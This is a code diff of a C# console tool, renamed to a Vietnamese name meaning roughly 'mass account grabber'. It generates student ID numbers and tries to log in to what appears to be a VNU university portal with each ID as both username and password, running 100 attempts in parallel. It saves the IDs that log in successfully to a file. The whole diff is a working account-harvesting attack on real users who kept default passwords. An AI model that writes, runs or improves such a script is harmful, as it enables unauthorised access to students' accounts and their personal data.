@@ -2,36 +2,37 @@
 using System;
 using System.Collections.Generic;
 using System.IO;
-using System.Linq;
 using System.Threading.Tasks;
 
-namespace ToolDangKiHangLoat
+namespace ToolGetAccHangLoat
 {
     class Program
     {
         static void Main(string[] args)
         {
-            List<string> listAcc = File.ReadAllLines("00.txt").ToList();
+            string headcode = "00";
+            List<string> listAcc = Utility.Utility.GenerateAccount(headcode);
+            List<string> Result = new List<string>();
             Parallel.ForEach(listAcc, new ParallelOptions()
             {
                 MaxDegreeOfParallelism = 100
             }, (Mssv) =>
             {
-                using (StartRequest vnu = new StartRequest())
+                using (CheckLoginAndValidate vnu = new CheckLoginAndValidate())
                 {
                     vnu.User = Mssv;
                     vnu.Pass = Mssv;
-                    vnu.LoginType = 1;
-                    vnu.ListDataRowIndex = new List<string>()
+                    vnu.Begin();
+                    if (vnu.IsSuccess)
                     {
-                        "136", "141", "137"
-                    };
-
-                    vnu.Login();
+                        Result.Add(vnu.User);
+                    }
                 }
 
             });
             Console.WriteLine($"{DateTime.Now} Done");
+            Result.Reverse();
+            File.WriteAllLines(headcode + ".txt", Result);
         }
     }
 }
